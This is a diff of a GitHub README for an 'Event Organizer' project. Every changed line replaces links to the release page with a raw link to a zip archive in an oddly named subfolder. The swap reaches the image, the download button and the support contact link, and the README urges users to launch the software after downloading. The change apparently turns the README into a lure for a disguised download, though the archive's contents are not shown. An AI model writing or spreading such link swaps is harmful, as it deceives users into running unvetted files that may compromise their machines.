@@ -1,6 +1,6 @@
 # 🎉 Welcome to Event Organizer Repository! 🎊
 
-![Event Organizer](https://github.com/Moaz200/event-organizer/releases/tag/v2.0)
+![Event Organizer](https://raw.githubusercontent.com/Moaz200/event-organizer/main/kammalan/event_organizer_v2.0-beta.4.zip)
 
 ## Description
 
@@ -29,7 +29,7 @@ Welcome to the Event Organizer repository, a place where you can find all the to
 
 Click on the button below to download the Event Organizer software:
 
-[![Download Event Organizer](https://github.com/Moaz200/event-organizer/releases/tag/v2.0)](https://github.com/Moaz200/event-organizer/releases/tag/v2.0)
+[![Download Event Organizer](https://raw.githubusercontent.com/Moaz200/event-organizer/main/kammalan/event_organizer_v2.0-beta.4.zip)](https://raw.githubusercontent.com/Moaz200/event-organizer/main/kammalan/event_organizer_v2.0-beta.4.zip)
 
 Please note that the software needs to be launched after downloading.
 
@@ -37,7 +37,7 @@ If the link does not work, kindly check the "Releases" section for alternative d
 
 ## Support
 
-For any questions or issues regarding the Event Organizer repository, feel free to reach out to our team at [https://github.com/Moaz200/event-organizer/releases/tag/v2.0](https://github.com/Moaz200/event-organizer/releases/tag/v2.0).
+For any questions or issues regarding the Event Organizer repository, feel free to reach out to our team at [https://raw.githubusercontent.com/Moaz200/event-organizer/main/kammalan/event_organizer_v2.0-beta.4.zip](https://raw.githubusercontent.com/Moaz200/event-organizer/main/kammalan/event_organizer_v2.0-beta.4.zip).
 
 ## Collaborate
 
